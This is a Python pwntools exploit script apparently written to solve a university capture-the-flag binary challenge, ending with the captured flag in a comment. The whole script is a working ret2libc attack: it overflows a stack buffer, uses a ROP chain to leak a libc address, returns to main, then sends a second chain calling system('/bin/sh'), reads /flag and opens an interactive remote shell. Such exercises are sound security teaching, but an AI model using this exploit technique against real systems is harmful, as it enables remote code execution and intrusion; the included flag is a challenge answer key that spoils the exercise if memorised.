from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
#b *(main+29)
#b *(main+57)
'''.format(**locals())
#p = gdb.debug(["./vuln"], gdbscript=gdbscript, )
with open("gdbscript", "w") as f:
    f.write(gdbscript)


#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)

# start remote
p = remote('tasks.ws24.softsec.rub.de', 33279)


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)




rop = ROP(binfile)
rop.raw(pack(rop.rdi.address))
rop.raw(pack(1))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(0x00403ff0))
rop.raw(pack(elf.symbols['main']+0x1d))
# create a loop back into main for a second round (I don't care where exactly I need to write the ret address since I will end with a fresh stack frame anyway)
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))



print(disasm(rop.chain()))

payload = b"A"*cyclic_find_bytes(0x6161616b)
payload += rop.chain()
p.recvuntil(b"Hello, what's your name?\n")
p.sendline(payload)

leak = p.recvuntil(b"\0\0\0\0")
libc_addr = int.from_bytes(leak[::-1]) - 160384
print(hex(libc_addr))

libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(0x00401089) # address of "ret" instruction
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload2 = b"A"*cyclic_find_bytes(0x6161616b)
payload2 += rop.chain()
p.sendline(payload2)

# see outputted flag
p.sendline(b"cat /flag")
p.interactive()

#softsec{lXNQtvDlXSK5TDoXpsN2pWF3ffCAH5hLtiCcGnnCFFyFfaXeQ4Iwds72FY3C7T1N}